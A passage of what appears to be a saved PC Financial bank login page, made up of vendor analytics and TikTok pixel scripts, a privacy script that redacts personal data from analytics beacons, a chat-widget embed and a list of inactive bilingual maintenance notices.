                  }; a.G = "supplementalDataID timestamp dynamicVariablePrefix visitorID marketingCloudVisitorID analyticsVisitorID audienceManagerLocationHint authState fid vmk visitorMigrationKey visitorMigrationServer visitorMigrationServerSecure charSet visitorNamespace cookieDomainPeriods fpCookieDomainPeriods cookieLifetime pageName pageURL customerPerspective referrer contextData currencyCode lightProfileID lightStoreForSeconds lightIncrementBy retrieveLightProfiles deleteLightProfiles retrieveLightData".split(" ");
        a.g = a.G.concat("purchaseID variableProvider channel server pageType transactionID campaign state zip events events2 products audienceManagerBlob tnt".split(" ")); a.ka = "timestamp charSet visitorNamespace cookieDomainPeriods cookieLifetime contextData lightProfileID lightStoreForSeconds lightIncrementBy".split(" "); a.Q = a.ka.slice(0); a.Da = "account allAccounts debugTracking visitor visitorOptedOut trackOffline offlineLimit offlineThrottleDelay offlineFilename usePlugins doPlugins configURL visitorSampling visitorSamplingGroup linkObject clickObject linkURL linkName linkType trackDownloadLinks trackExternalLinks trackClickMap trackInlineStats linkLeaveQueryString linkTrackVars linkTrackEvents linkDownloadFileTypes linkExternalFilters linkInternalFilters useForcedLinkTracking forcedLinkTrackingTimeout useLinkTrackSessionStorage trackingServer trackingServerSecure ssl abort mobile dc lightTrackVars maxDelay expectSupplementalData usePostbacks registerPreTrackCallback registerPostTrackCallback AudienceManagement".split(" ");
        for (G = 0; 250 >= G; G++)76 > G && (a.g.push("prop" + G), a.Q.push("prop" + G)), a.g.push("eVar" + G), a.Q.push("eVar" + G), 6 > G && a.g.push("hier" + G), 4 > G && a.g.push("list" + G); G = "pe pev1 pev2 pev3 latitude longitude resolution colorDepth javascriptVersion javaEnabled cookiesEnabled browserWidth browserHeight connectionType homepage pageURLRest marketingCloudOrgID ms_a".split(" "); a.g = a.g.concat(G); a.G = a.G.concat(G); a.ssl = 0 <= y.location.protocol.toLowerCase().indexOf("https"); a.charSet = "UTF-8"; a.contextData = {}; a.offlineThrottleDelay =
          0; a.offlineFilename = "AppMeasurement.offline"; a.R = "s_sq"; a.Sa = 0; a.ia = 0; a.P = 0; a.Ra = 0; a.linkDownloadFileTypes = "exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx"; a.w = y; a.d = y.document; try { if (a.Xa = !1, navigator) { var Z = navigator.userAgent; if ("Microsoft Internet Explorer" == navigator.appName || 0 <= Z.indexOf("MSIE ") || 0 <= Z.indexOf("Trident/") && 0 <= Z.indexOf("Windows NT 6")) a.Xa = !0 } } catch (c) { } a.da = function () {
            a.ea && (y.clearTimeout(a.ea), a.ea = O); a.k && a.L && a.k.dispatchEvent(a.L); a.v && ("function" == typeof a.v ?
              a.v() : a.k && a.k.href && (a.d.location = a.k.href)); a.k = a.L = a.v = 0
          }; a.Va = function () {
            a.b = a.d.body; a.b ? (a.u = function (c) {
              var d, g, h; if (!(a.d && a.d.getElementById("cppXYctnr") || c && c["s_fe_" + a._in])) {
                if (a.Fa) if (a.useForcedLinkTracking) a.b.removeEventListener("click", a.u, !1); else { a.b.removeEventListener("click", a.u, !0); a.Fa = a.useForcedLinkTracking = 0; return } else a.useForcedLinkTracking = 0; a.clickObject = c.srcElement ? c.srcElement : c.target; try {
                  if (!a.clickObject || a.O && a.O == a.clickObject || !(a.clickObject.tagName || a.clickObject.parentElement ||
                    a.clickObject.parentNode)) a.clickObject = 0; else {
                      var m = a.O = a.clickObject; a.ha && (clearTimeout(a.ha), a.ha = 0); a.ha = setTimeout(function () { a.O == m && (a.O = 0) }, 1E4); var v = a.Ma(); a.track(); if (v < a.Ma() && a.useForcedLinkTracking && c.target) {
                        for (g = c.target; g && g != a.b && "A" != g.tagName.toUpperCase() && "AREA" != g.tagName.toUpperCase();)g = g.parentNode; if (g && (h = g.href, a.Oa(h) || (h = 0), d = g.target, c.target.dispatchEvent && h && (!d || "_self" == d || "_top" == d || "_parent" == d || y.name && d == y.name))) {
                          try { var u = a.d.createEvent("MouseEvents") } catch (B) {
                            u =
                            new y.MouseEvent
                          } if (u) { try { u.initMouseEvent("click", c.bubbles, c.cancelable, c.view, c.detail, c.screenX, c.screenY, c.clientX, c.clientY, c.ctrlKey, c.altKey, c.shiftKey, c.metaKey, c.button, c.relatedTarget) } catch (B) { u = 0 } u && (u["s_fe_" + a._in] = u.s_fe = 1, c.stopPropagation(), c.stopImmediatePropagation && c.stopImmediatePropagation(), c.preventDefault(), a.k = c.target, a.L = u) }
                        }
                      }
                  }
                } catch (B) { a.clickObject = 0 }
              }
            }, a.b && a.b.attachEvent ? a.b.attachEvent("onclick", a.u) : a.b && a.b.addEventListener && (navigator && (0 <= navigator.userAgent.indexOf("WebKit") &&
              a.d.createEvent || 0 <= navigator.userAgent.indexOf("Firefox/2") && y.MouseEvent) && (a.Fa = 1, a.useForcedLinkTracking = 1, a.b.addEventListener("click", a.u, !0)), a.b.addEventListener("click", a.u, !1))) : setTimeout(a.Va, 30)
          }; a.Fb(); a.fc || (Q ? a.setAccount(Q) : a.D("Error, missing Report Suite ID in AppMeasurement initialization"), a.Va(), a.loadModule("ActivityMap"))
      }
      function s_gi(Q) { var a = window.s_c_il, y, O = Q.split(","), R, S, G = 0; if (a) for (y = 0; !G && y < a.length;) { var N = a[y]; if ("s_c" == N._c && (N.account || N.oun)) if (N.account && N.account == Q) G = 1; else { var Z = N.account ? N.account : N.oun; Z = N.allAccounts ? N.allAccounts : Z.split(","); for (R = 0; R < O.length; R++)for (S = 0; S < Z.length; S++)O[R] == Z[S] && (G = 1) } y++ } G ? N.setAccount && N.setAccount(Q) : N = new AppMeasurement(Q); return N } AppMeasurement.getInstance = s_gi; window.s_objectID || (window.s_objectID = 0);
      function s_pgicq() { var Q = window, a = Q.s_giq, y; if (a) for (y = 0; y < a.length; y++) { var O = a[y]; var R = s_gi(O.oun); R.setAccount(O.un); R.setTagContainer(O.tagContainerName) } Q.s_giq = 0 } s_pgicq();</script>
  <script type="text/javascript"
    id="">var domain = window.location.hostname.replace("www", ""), rsid = "";
      "sit1.cardinaldev.io" == domain ? rsid = "pcfinancialpublic-stage" : "pcfsit1.cardinaldev.io" == domain ? rsid = "pcfinancialpublic-stage" : "oneapp-sit1.cardinaldev.io" == domain ? rsid = "pcfinancialpublic-stage" : "sit0.cardinaldev.io" == domain ? rsid = "pcfinancialpublic-stage" : "secure.sit1.pcf.local" == domain ? rsid = "pcfinancialpublic-stage" : "sit1.pcf.local" == domain ? rsid = "pcfinancialpublic-stage" : "insurance.sit1.pcf.local" == domain ? rsid = "pcfinancialpublic-stage" : "apply.sit1.pcf.local" == domain ? rsid = "pcfinancialpublic-stage" :
        "ua18c2001.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "ua18c2002.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "ua18c2003.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "ua18c2004.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "ua18c2005.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "app.sit1.pcf.local" == domain ? rsid = "pcfinancialpublic-stage" : "mock.cardinaldev.io" == domain ? rsid = "pcfinancialpublic-stage" : "uat.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" :
          "uat.pcinsurance.ca" == domain ? rsid = "pcfinancialpublic-stage" : "secure.uat.pcinsurance.ca" == domain ? rsid = "pcfinancialpublic-stage" : "pilot.pcinsurance.ca" == domain ? rsid = "pcfinancialpublic-stage" : "pilot.pcfinancial.ca" == domain ? rsid = "pcfinancialpublic-stage" : "pcfinancial.ca" == domain ? rsid = "pcfinancial-live" : "secure.pcfinancial.ca" == domain ? rsid = "pcfinancial-live" : "pcinsurance.ca" == domain ? rsid = "pcfinancial-live" : "www.pcfinancial.ca" == domain ? rsid = "pcfinancial-live" : ".pcfinancial.ca" == domain ? rsid = "pcfinancial-live" :
            "app.pcfinancial.ca" == domain ? rsid = "pcfinancial-live" : "apply.pcfinancial.ca" == domain ? rsid = "pcfinancial-live" : "pcf-web-staging.bnotions.com" == domain ? rsid = "pcfinancialpublic-stage" : "pcf-web-develop.bnotions.com" == domain && (rsid = "pcfinancialpublic-stage"); var s = s_gi(rsid); s.account = rsid; s.trackingServer = "pcfinancial.sc.omtrdc.net"; s.visitorNamespace = "pcfinancial"; s.visitor = Visitor.getInstance("4C4A56F358B6286D0A495DE5@AdobeOrg"); s.trackDownloadLinks = !0; s.trackExternalLinks = !0; s.trackInlineStats = !0;
      s.linkDownloadFileTypes = "exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx"; s.linkInternalFilters = "sit1.cardinaldev.io,pcfsit1.cardinaldev.io,sit0.cardinaldev.io,mock.cardinaldev.io,uat.pcfinancial.ca,uat.pcinsurance.ca,secure.uat.pcinsurance.ca,secure.uat.pcfinancial.ca,pcoptimum.ca,secure.pcfinancial.ca,pcfinancial.ca,pcinsurance.ca,pcf-web-staging.bnotions.com,pcf-web-develop.bnotions.com,javascript:"; s.linkLeaveQueryString = !1; s.linkTrackVars = !0; s.linkTrackEvents = !0; s.usePlugins = !0;
      function s_doPlugins(a) {
        a.list1 = a.gatherIntPromo("intcid", 0); a.eVar8 = a.getPreviousValue(a.pageName, "s_ppn"); a.prop8 = "D\x3dv8"; a.eVar31 = a.getTimeParting("d", "-5"); a.eVar32 = a.getTimeParting("h", "-5"); a.eVar33 = a.getTimeParting("w", "-5"); a.eVar34 = a.getVisitNum(); a.eVar37 = a.getNewRepeat(30, "s_getNewRepeat"); a.prop31 = "D\x3dv31"; a.prop32 = "D\x3dv32"; a.prop33 = "D\x3dv33"; a.prop34 = "D\x3dv34"; a.prop37 = "D\x3dv37"; a.trackExternalLinks = !0; a.campaign = a.getValOnce(a.campaign, "s_cmp", 30); "d" == a.linkType && (a.linkTrackVars =
          "eVar17,events", a.linkTrackEvents = "event11", a.eVar17 = a.linkURL, a.events = "event11"); "e" == a.linkType && (a.linkTrackVars = "eVar18,events", a.linkTrackEvents = "event12", a.eVar18 = a.linkURL, a.events = "event12"); a.campaign || (a._utm_source = a.getQueryParam("utm_source"), a._utm_medium = a.getQueryParam("utm_medium"), a._utm_campaign = a.getQueryParam("utm_campaign"), a._utm_content = a.getQueryParam("utm_content"), a.campaign = a._utm_source + "|" + a._utm_medium + "|" + a._utm_campaign + "|" + a._utm_content, "|||" === a.campaign && (a.campaign =
            ""))
      } s.doPlugins = s_doPlugins; s._tpDST = { 2012: "4/1,10/7", 2013: "4/7,10/6", 2014: "4/6,10/5", 2015: "4/5,10/4", 2016: "4/3,10/2", 2017: "4/2,10/1", 2018: "4/1,10/7", 2019: "4/7,10/6" }; s._tpDST = { 2012: "3/11,11/4", 2013: "3/10,11/3", 2014: "3/9,11/2", 2015: "3/8,11/1", 2016: "3/13,11/6", 2017: "3/12,11/5", 2018: "3/11,11/4", 2019: "3/10,11/3" }; s._tpDST = { 2012: "3/25,10/28", 2013: "3/31,10/27", 2014: "3/30,10/26", 2015: "3/29,10/25", 2016: "3/27,10/30", 2017: "3/26,10/29", 2018: "3/25,10/28", 2019: "3/31,10/27" };
      s.getPreviousValue = new Function("v", "c", "el", "var s\x3dthis,t\x3dnew Date,i,j,r\x3d'';t.setTime(t.getTime()+1800000);if(el){if(s.events){i\x3ds.split(el,',');j\x3ds.split(s.events,',');for(x in i){for(y in j){if(i[x]\x3d\x3dj[y]){if(s.c_r(c)) r\x3ds.c_r(c);v?s.c_w(c,v,t):s.c_w(c,'no value',t);return r}}}}}else{if(s.c_r(c)) r\x3ds.c_r(c);v?s.c_w(c,v,t):s.c_w(c,'no value',t);return r}"); s.split = new Function("l", "d", "var i,x\x3d0,a\x3dnew Array;while(l){i\x3dl.indexOf(d);i\x3di\x3e-1?i:l.length;a[x++]\x3dl.substring(0,i);l\x3dl.substring(i+d.length);}return a");
      s.getTimeParting = new Function("t", "z", "var s\x3dthis,d,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T;d\x3dnew Date();A\x3dd.getFullYear();if(A\x3d\x3d'2009'){B\x3d'08';C\x3d'01'}if(A\x3d\x3d'2010'){B\x3d'14';C\x3d'07'}if(A\x3d\x3d'2011'){B\x3d'13';C\x3d'06'}if(A\x3d\x3d'2012'){B\x3d'11';C\x3d'04'}if(A\x3d\x3d'2013'){B\x3d'10';C\x3d'03'}if(A\x3d\x3d'2014'){B\x3d'09';C\x3d'02'}if(!B||!C){B\x3d'08';C\x3d'01'}B\x3d'03/'+B+'/'+A;C\x3d'11/'+C+'/'+A;D\x3dnew Date('1/1/2000');if(D.getDay()!\x3d6||D.getMonth()!\x3d0){return'Data Not Available'}else{z\x3dparseFloat(z);E\x3dnew Date(B);F\x3dnew Date(C);G\x3dF;H\x3dnew Date();if(H\x3eE\x26\x26H\x3cG){z\x3dz+1}else{z\x3dz};I\x3dH.getTime()+(H.getTimezoneOffset()*60000);J\x3dnew Date(I+(3600000*z));K\x3d['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];L\x3dJ.getHours();M\x3dJ.getMinutes();N\x3dJ.getDay();O\x3dK[N];P\x3d'AM';Q\x3d'Weekday';R\x3d'00';if(M\x3e30){R\x3d'30'}if(L\x3e\x3d12){P\x3d'PM';L\x3dL-12};if(L\x3d\x3d0){L\x3d12};if(N\x3d\x3d6||N\x3d\x3d0){Q\x3d'Weekend'}T\x3dL+':'+R+P;if(t\x3d\x3d'h'){return T}if(t\x3d\x3d'd'){return O}if(t\x3d\x3d'w'){return Q}}");
      s.getNewRepeat = new Function("d", "cn", "var s\x3dthis,e\x3dnew Date(),cval,sval,ct\x3de.getTime();d\x3dd?d:30;cn\x3dcn?cn:'s_nr';e.setTime(ct+d*24*60*60*1000);cval\x3ds.c_r(cn);if(cval.length\x3d\x3d0){s.c_w(cn,ct+'-New',e);return'New';}sval\x3ds.split(cval,'-');if(ct-sval[0]\x3c30*60*1000\x26\x26sval[1]\x3d\x3d'New'){s.c_w(cn,ct+'-New',e);return'New';}else{s.c_w(cn,ct+'-Repeat',e);return'Repeat';}"); s.split = new Function("l", "d", "var i,x\x3d0,a\x3dnew Array;while(l){i\x3dl.indexOf(d);i\x3di\x3e-1?i:l.length;a[x++]\x3dl.substring(0,i);l\x3dl.substring(i+d.length);}return a");
      s.getVisitNum = new Function("tp", "c", "c2", "var s\x3dthis,e\x3dnew Date,cval,cvisit,ct\x3de.getTime(),d;if(!tp){tp\x3d'm';}if(tp\x3d\x3d'm'||tp\x3d\x3d'w'||tp\x3d\x3d'd'){eo\x3ds.endof(tp),y\x3deo.getTime();e.setTime(y);}else {d\x3dtp*86400000;e.setTime(ct+d);}if(!c){c\x3d's_vnum';}if(!c2){c2\x3d's_invisit';}cval\x3ds.c_r(c);if(cval){var i\x3dcval.indexOf('\x26vn\x3d'),str\x3dcval.substring(i+4,cval.length),k;}cvisit\x3ds.c_r(c2);if(cvisit){if(str){e.setTime(ct+1800000);s.c_w(c2,'true',e);return str;}else {return 'unknown visit number';}}else {if(str){str++;k\x3dcval.substring(0,i);e.setTime(k);s.c_w(c,k+'\x26vn\x3d'+str,e);e.setTime(ct+1800000);s.c_w(c2,'true',e);return str;}else {s.c_w(c,e.getTime()+'\x26vn\x3d1',e);e.setTime(ct+1800000);s.c_w(c2,'true',e);return 1;}}");
      s.dimo = new Function("m", "y", "var d\x3dnew Date(y,m+1,0);return d.getDate();"); s.endof = new Function("x", "var t\x3dnew Date;t.setHours(0);t.setMinutes(0);t.setSeconds(0);if(x\x3d\x3d'm'){d\x3ds.dimo(t.getMonth(),t.getFullYear())-t.getDate()+1;}else if(x\x3d\x3d'w'){d\x3d7-t.getDay();}else {d\x3d1;}t.setDate(t.getDate()+d);return t;"); s.apl = new Function("l", "v", "d", "u", "var s\x3dthis,m\x3d0;if(!l)l\x3d'';if(u){var i,n,a\x3dl.split(d),al\x3da.length;for(i\x3d0;i\x3cal;i++){n\x3da[i];m\x3dm||(u\x3d\x3d1?(n\x3d\x3dv):(n.toLowerCase()\x3d\x3dv.toLowerCase()));}}if(!m)l\x3dl?l+d+v:v;return l;");
      s.gatherIntPromo = new Function("p", "m", "r", "var s\x3dthis,a,d,e,i,l\x3d'',r\x3dr?r:'';if(m\x3d\x3d'0'){a\x3ddocument.getElementsByTagName('a');for(i\x3d0;i\x3c\x3da.length-1;i++){if(a[i].href.indexOf(p)!\x3d-1){if(l\x3d\x3d''){l\x3ds.getURLVars(a[i].href)[p];}else{l\x3dl+','+s.getURLVars(a[i].href)[p];}}}}else if(m\x3d\x3d'1'){a\x3ddocument.getElementsByTagName('body')[0].innerHTML;e\x3da.match(r);if(e\x3d\x3dnull){return null;}else{d\x3ds.eliminateDuplicates(e);for(i\x3d0;i\x3c\x3dd.length-1;i++){if(d[i].indexOf(p)!\x3d-1){if(l\x3d\x3d''){l\x3ds.getURLVars(d[i])[p];}else{l\x3dl+','+s.getURLVars(d[i])[p];}}}}}return l;");
      s.eliminateDuplicates = new Function("ar", "var s\x3dthis,j,le\x3dar.length,ou\x3d[],ob\x3d{};for(j\x3d0;j\x3cle;j++){ob[ar[j]]\x3d0;}for(j in ob){ou.push(j);}return ou;"); s.getURLVars = new Function("u", "var s\x3dthis,k,uv\x3d[],uh,h\x3du.slice(u.indexOf('?')+1).split('\x26');for(k\x3d0;k\x3ch.length;k++){uh\x3dh[k].split('\x3d');uv.push(uh[0]);uv[uh[0]]\x3duh[1];}return uv;"); s.getValOnce = new Function("v", "c", "e", "t", "var s\x3dthis,a\x3dnew Date,v\x3dv?v:'',c\x3dc?c:'s_gvo',e\x3de?e:0,i\x3dt\x3d\x3d'm'?60000:86400000,k\x3ds.c_r(c);if(v){a.setTime(a.getTime()+e*i);s.c_w(c,v,e\x3d\x3d0?0:a);}return v\x3d\x3dk?'':v");
      s.getQueryParam = function (a, c, g, e) { var h = this, b = "", f; c = c ? c : ""; for (g = g ? g : h.pageURL ? h.pageURL : h.wd ? h.wd.location : window.location; a;) { var d = a.indexOf(","); d = 0 > d ? a.length : d; (f = h.p_gpv(a.substring(0, d), g + "", e)) && (f = -1 < f.indexOf("#") ? f.substring(0, f.indexOf("#")) : f); f && (b += b ? c + f : f); a = a.substring(d == a.length ? d : d + 1) } return b }; s.p_gpv = function (a, c, g) { var e = this, h = ""; j = 1 == g ? "#" : "?"; i = c.indexOf(j); a && -1 < i && (c = c.substring(i + 1), h = e.pt(c, "\x26", "p_gvf", a)); return h };
      s.p_gvf = function (a, c) { if (a) { var g = this, e = a.indexOf("\x3d"), h = 0 > e ? a : a.substring(0, e); e = 0 > e ? !0 : a.substring(e + 1); if (h.toLowerCase() == c.toLowerCase()) return g.epa ? g.epa(e) : g.unescape(e) } return "" }; s.pt = function (a, c, g, e) { for (var h = this, b = a, f = 0, d; b;) { d = b.indexOf(c); d = 0 > d ? b.length : d; b = b.substring(0, d); if (b = h[g](b, e)) return b; f += d + c.length; b = a.substring(f, a.length); b = f < a.length ? b : "" } return "" };</script>
  <script type="text/javascript"
    id="">!function (d, g, e) {
        d.TiktokAnalyticsObject = e; var a = d[e] = d[e] || []; a.methods = "page track identify instances debug on off once ready alias group enableCookie disableCookie".split(" "); a.setAndDefer = function (b, c) { b[c] = function () { b.push([c].concat(Array.prototype.slice.call(arguments, 0))) } }; for (d = 0; d < a.methods.length; d++)a.setAndDefer(a, a.methods[d]); a.instance = function (b) { b = a._i[b] || []; for (var c = 0; c < a.methods.length; c++)a.setAndDefer(b, a.methods[c]); return b }; a.load = function (b, c) {
          var f = "https://analytics.tiktok.com/i18n/pixel/events.js";
          a._i = a._i || {}; a._i[b] = []; a._i[b]._u = f; a._t = a._t || {}; a._t[b] = +new Date; a._o = a._o || {}; a._o[b] = c || {}; c = document.createElement("script"); c.type = "text/javascript"; c.async = !0; c.src = f + "?sdkid\x3d" + b + "\x26lib\x3d" + e; b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(c, b)
        }; a.load("CFC4ERJC77U2ISB9Q8DG"); a.page()
      }(window, document, "ttq");</script>
  <div id="ada-entry">
    <div
      style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;">
    </div><iframe src="./Login _ PC Financial_files/index.html" scrolling="no" frameborder="0" id="ada-x-storage-frame"
      name="ada-x-storage-frame" title="ada-x-storage-frame" class="ada-x-storage-frame" role="application"
      style="position: absolute; top: -9999px; left: -9999px; visibility: hidden; height: 0px; width: 0px;"></iframe><iframe
      src="./Login _ PC Financial_files/index(1).html" scrolling="no" frameborder="0" id="ada-button-frame"
      name="ada-button-frame" title="Pc-financial Chat Button Frame" class="ada-button-frame" role="application"
      style="position: fixed; z-index: 10000; overflow: hidden; visibility: visible; opacity: 1; transition: visibility 250ms ease 0s, opacity 250ms ease 0s, transform 250ms ease 0s; right: 0px; bottom: 0px; transform: translate(0px, 0px); width: 112px; height: 112px;"></iframe>
  </div>
  <script type="text/javascript"
    id="">(function () {
        window.__piiRedact = window.__piiRedact || !1; var k = function (f) {
          var c = [{ name: "EMAIL", regex: /[^\/]{4}(@|%40)(?!example\.com)[^\/]{4}/gi, group: "" }, { name: "SELF-EMAIL", regex: /[^\/]{4}(@|%40)(?=example\.com)[^\/]{4}/gi, group: "" }, { name: "TEL", regex: /((tel=)|(telephone=)|(phone=)|(mobile=)|(mob=))[\d\+\s][^&\/\?]+/gi, group: "$1" }, { name: "NAME", regex: /((firstname=)|(lastname=)|(surname=))[^&\/\?]+/gi, group: "$1" }, { name: "PASSWORD", regex: /((password=)|(passwd=)|(pass=))[^&\/\?]+/gi, group: "$1" }, {
            name: "ZIP",
            regex: /((postcode=)|(zipcode=)|(zip=))[^&\/\?]+/gi, group: "$1"
          }], d = function (a) { return (a || document.location.search).replace(/(^\?)/, "").split("\x26").map(function (b) { return b = b.split("\x3d"), this[b[0]] = decodeURIComponent(b[1]), this }.bind({}))[0] }, h = function (a) { return Object.keys(a).map(function (b) { return b + "\x3d" + encodeURIComponent(a[b]) }).join("\x26") }, e = d(f), g; for (g in e) c.forEach(function (a) { e[g].match(a.regex) && (e[g] = e[g].replace(a.regex, a.group + "[REDACTED " + a.name + "]")) }); return h(e)
        }; if (!window.__piiRedact) {
          window.__piiRedact =
          !0; try { var l = window.navigator.sendBeacon; window.navigator.sendBeacon = function () { if (arguments && arguments[0].match(/google-analytics\.com.*v=2&/)) { var f = arguments[0].split("?")[0], c = arguments[0].split("?")[1]; c = k(c); var d = []; arguments[1] && arguments[1].split("\r\n").forEach(function (h) { d.push(k(h)) }); arguments[0] = [f, c].join("?"); arguments[1] && 0 < d.length && d.join("\r\n") } return l.apply(this, arguments) } } catch (f) { return l.apply(this, arguments) }
        }
      })();</script>
  <script type="text/javascript" id="">(function () {
      for (var c = [{
        active: !1, message: { en: "We are currently performing maintenance on our site and Enrollment, Password Reset \x26 Profile Update functionalities are temporarily unavailable.Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "En raison de travaux de maintenance sur notre site, l\u2019inscription, la r\u00e9initialisation du mot de passe et la mise \u00e0 jour du profil sont temporairement indisponibles.Veuillez r\u00e9essayer plus tard. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients que cette situation pourrait causer. Nous vous remercions de votre patience." },
        conditions: [{ field: "phx_page", value: ["applyprocessing:onfido:email:start now"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Enrollment, Password Reset \x26 Profile Update functionalities are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "En raison de travaux de maintenance sur notre site, l\u2019inscription, la r\u00e9initialisation du mot de passe et la mise \u00e0 jour du profil sont temporairement indisponibles. Veuillez r\u00e9essayer plus tard. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients que cette situation pourrait causer. Nous vous remercions de votre patience." },
        conditions: [{ field: "phx_page", value: ["login"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Enrollment functionality is temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "Nous effectuons actuellement une maintenance sur notre site et la fonctionnalit\u00e9 d'inscription est temporairement indisponible. Veuillez r\u00e9essayer plus tard. Nous nous excusons pour ce d\u00e9sagr\u00e9ment. Merci pour votre patience." },
        conditions: [{ field: "phx_page", value: ["dashboard"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently experiencing a service disruption for those trying to activate or update their balance and spending alerts. We\u2019re sorry for the inconvenience and are working hard to fix this.", fr: "Nous \u00e9prouvons des probl\u00e8mes d\u2019interruption de service pour ceux qui essayent d'activ\u00e9 our changer les notifications de solde et d\u00e9penses. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients occasionn\u00e9s par cette situation et travaillons \u00e0 r\u00e9soudre le probl\u00e8me." },
        conditions: [{ field: "phx_page", value: ["applications"] }]
      }, {
        active: !1, message: { en: "We are currently experiencing a service disruption for those trying to access e-statements. We are working to resolve this issue quickly and apologize for any inconvenience. Customers can continue to access their transactions and account information through the PC Financial secure website and app. Thank you for your patience.", fr: "En raison d'une interruption de service, les relev\u00e9s \u00e9lectroniques sont temporairement indisponibles. Nous nous excusons pour tout inconv\u00e9nient r\u00e9sultant de cette situation et nous nous effor\u00e7ons d'y rem\u00e9dier le plus rapidement possible. Les clients peuvent continuer \u00e0 acc\u00e9der \u00e0 leurs transactions et aux informations de leur compte via le site Web et l'application s\u00e9curis\u00e9s de PC Finance. Nous vous remercions de votre patience." },
        conditions: [{ field: "account_type", value: ["credit-card"] }, { field: "phx_page", value: ["accountsoverview"] }]
      }, {
        active: !1, message: { en: "Due to scheduled maintenance, your changes to alert preferences may not be saved. Sorry for the inconvenience.", fr: "En raison de la maintenance planifi\u00e9e du syst\u00e8me, les changements effectu\u00e9s aux pr\u00e9f\u00e9rences concernant les alertes ne puissent pas \u00eatre sauvegard\u00e9s. Nous sommes d\u00e9sol\u00e9s pour tout inconv\u00e9nients." }, conditions: [{
          field: "phx_page",
          value: ["notificationprefs"]
        }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site. Add/Modify a payee functionality would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement des op\u00e9rations de maintenance sur notre site. Ajouter / modifier une fonctionnalit\u00e9 de b\u00e9n\u00e9ficiaire serait temporairement indisponible. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s pour la g\u00eane occasionn\u00e9e." },
        conditions: [{ field: "phx_page", value: ["selectpayee", "dashboard"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Enrollment \x26 Password Reset functionalities are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "Nous effectuons actuellement une maintenance sur notre site et les fonctionnalit\u00e9s d'inscription et de r\u00e9initialisation du mot de passe sont temporairement indisponibles. Veuillez r\u00e9essayer plus tard. Nous nous excusons pour ce d\u00e9sagr\u00e9ment. Merci pour votre patience." },
        conditions: [{ field: "phx_page", value: ["cardsoverview"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Interac e-Transfers\u00ae services are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "En raison de travaux de maintenance, notre site, le service de Virement InteracMD est temporairement indisponible. Veuillez r\u00e9essayer plus tard. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients que cette situation pourrait causer. Nous vous remercions de votre patience." },
        conditions: [{ field: "phx_page", value: ["interac"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site and card management functionalities would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement une maintenance sur notre site et les fonctionnalit\u00e9s de gestion des cartes seraient temporairement indisponibles. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s pour le d\u00e9sagr\u00e9ment." },
        conditions: [{ field: "phx_page", value: ["cardsoverview"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site and profile update functionalities would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement des op\u00e9rations de maintenance sur notre site et la fonctionnalit\u00e9 de mise \u00e0 jour de profil serait temporairement indisponible. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s du d\u00e9rangement." },
        conditions: [{ field: "phx_page", value: ["customeroverview"] }]
      }, {
        active: !1, message: { en: 'A fast way to fund your new PC Money\u2122 Account is by requesting an \x3ca href\x3d"https://secure.pcfinancial.ca/en/my/dashboard(transfer:email/request)"\x3eInterac e-Transfer\u00ae\x3c/a\x3e. Try it today!', fr: 'Un moyen d\u2019approvisionner rapidement votre compte PC ArgentMC est de demander un Virement \x3ca href\x3d"https://secure.pcfinancial.ca/fr/my/dashboard(transfer:email/request)"\x3eInteracMD\x3c/a\x3e. Essayez-le d\u00e8s aujourd\u2019hui!' },
        conditions: [{ field: "account_type", value: ["credit-individual", "individual"] }, { field: "phx_page", value: ["dashboard"] }]
      }], h = "", k = !1, b = 0; b < c.length; b++)if (c[b].active) {
        for (var g = !0, e = 0; e < c[b].conditions.length; e++)if ("phx_page" == c[b].conditions[e].field) { for (var a = !1, f = 0; f < c[b].conditions[e].value.length; f++)a = a || google_tag_manager["rm"]["9139982"](614) == c[b].conditions[e].value[f]; g = g && a } else if ("phx_path" == c[b].conditions[e].field) {
